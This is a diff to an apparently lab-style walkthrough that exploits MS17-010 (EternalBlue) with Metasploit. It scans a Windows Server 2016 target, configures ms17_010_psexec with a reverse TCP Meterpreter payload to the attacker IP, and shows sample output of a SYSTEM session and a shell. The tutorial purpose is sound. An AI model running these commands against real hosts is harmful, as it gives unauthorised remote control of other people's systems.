@@ -261,7 +261,7 @@ Open msfconsole and search for the for the identified service.
 msfconsole
 ```
 
-**Attack Machine: Determine an Exploit Path**  
+**Attack Machine: Determine if the targert is vulnerable** 
 
 ```bash
 use auxiliary/scanner/smb/smb_ms17_010 
@@ -270,35 +270,53 @@ set RHOSTS <TARGET IP>
 run
 ```
 
+Expected output  
+
+```bash
+# [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> run
+
+# [+] <TARGET IP>:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
+# [*] <TARGET IP>:445       - Scanned 1 of 1 hosts (100% complete)
+# [*] Auxiliary module execution completed
+```
+
 Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.
 
 **Attack Machine: Choose & Configure Our Exploit & Payload**
 
 ```bash
 search eternal
-use 2
+use exploit/windows/smb/ms17_010_psexec
 options
+set LHOST <ATTACKER IP>
+set RHOSTS <TARGET IP>
 ```
 
 Since I have had more luck with the psexec version of this exploit, we will try that one first. Let's choose it and continue the setup.
-
-**Attack Machine: Validate Our Options**  
-
-```bash
-show options
-```
-
 This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload.
 
 **Attack Machine: Execute Our Attack**  
 
 ```bash
-exploit
+run
+```
+
+Expected output  
+
+```bash
+# [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
 
 # [*] Started reverse TCP handler on <ATTACKER IP>:4444 
-# [*] <WINDOWS IP>:445 - Target OS: Windows Server 2016 Standard 14393
-# [*] <WINDOWS IP>:445 - Built a write-what-where primitive...
-# [+] <WINDOWS IP>:445 - Overwrite complete... SYSTEM session obtained!
+# [*] <TARGET IP>:445 - Target OS: Windows Server 2016 Standard 14393
+# [*] <TARGET IP>:445 - Built a write-what-where primitive...
+# [+] <TARGET IP>:445 - Overwrite complete... SYSTEM session obtained!
+# [*] <TARGET IP>:445 - Selecting PowerShell target
+# [*] <TARGET IP>:445 - Executing the payload...
+# [+] <TARGET IP>:445 - Service start timed out, OK if running a command or non-service executable...
+# [*] Sending stage (175174 bytes) to <TARGET IP>
+# [*] Meterpreter session 1 opened (<ATTACKER IP>:4444 -> <TARGET IP>:49672) at 2025-06-24 13:13:34 -0400
+
+# (Meterpreter 1)(C:\Windows\system32) > 
 ```
 
 Now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt
@@ -308,7 +326,11 @@ If you wish to interact with the host directly, you can also drop into an intera
 
 ```bash
 getuid
+```
 
+Expected output  
+
+```bash
 # Server username: NT AUTHORITY\SYSTEM
 ```
 
@@ -318,7 +340,11 @@ From here, we can utilize Meterpreter to run further commands to gather system i
 **Attack Machine: Identify Our Shell**  
 ```bash
 shell
+```
 
+Expected output  
+
+```bash
 # Process 4844 created.
 # Channel 1 created.
 # Microsoft Windows [Version 10.0.14393]
